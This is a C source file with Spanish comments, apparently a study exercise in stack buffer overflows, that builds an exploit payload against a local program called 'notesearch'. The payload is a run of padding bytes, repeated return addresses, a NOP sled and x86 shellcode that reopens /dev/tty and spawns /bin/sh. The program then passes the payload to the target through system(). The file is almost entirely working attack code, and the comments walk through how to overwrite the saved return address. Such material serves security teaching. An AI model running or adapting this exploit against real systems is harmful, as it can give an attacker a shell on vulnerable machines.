#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char *prueba(unsigned int *pos, unsigned int offset, unsigned int *largo);

int main(int argc, char *argv[])
{
    //Variables locales. Se crearán en el stack
    int largo, offset = -10;
    char *command, *buffer;
    char *programa = "./notesearch \'";

    if (argc > 1) // Set offset.
        offset = atoi(argv[1]);

    buffer = prueba(&largo, offset, &largo);

    //Reserva espacio en el heap
    command = (char *)malloc(largo + strlen(programa));
    strcpy(command, programa); // Start command buffer.
    memcpy(command + strlen(programa), buffer, largo);

    system(command); // Run exploit.
    free(command);
}

char *prueba(unsigned int *pos, unsigned int offset, unsigned int *largo)
{

    int pad = 100, //tamaño del buffer de la función + 4
        rep = 10,
        nop = 60,
        code;
    char *explota;
    char *eip;
    unsigned int address;
    char *shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
    code = strlen(shellcode);
    *largo = pad + sizeof(eip) * rep + nop + code;
    explota = malloc(*largo);

    /*
    explota es un puntero a la heap.
    
    los datos que coloquemos en este puntero se usaran para hacer el buffer overflow

    Colocaremos lo siguiente:
    - padding. No hace nada, solo sirve de relleno
    - direccion del código a ejecutar. Esta posición tiene que coincidir con el EIP. Tiene que apuntar al código que vamos a incluir - ver siguiente punto. Tiene que apuntar a cualquiera de las instrucciones NOP del código
    - código. El código seran instrucciones NOP seguidas del código que queremos inyectar

    PAD deberá quedar por encima del EIP
    Alguna de las direcciones que informamos como EIP deberá sobre-escribir la direccion de retorno de la pila. 
    La dirección deberá apuntar a la zona donde guardamos NOP
    NOP y el código se 
    PAD
    */

    //PAD
    memset(explota, 0x41, pad);
    //EIP
    eip = pos - offset;
    address = (unsigned int)eip;
    for (int i = 0; i < rep; i++)
    {
        memcpy(&explota[pad + i * sizeof(address)], &address, sizeof(address));
    }
    //NOP
    memset(explota + pad + sizeof(address) * rep, 0x90, nop);
    //Codigo
    memcpy(explota + pad + sizeof(address) * rep + nop, shellcode, code);

    return explota;
}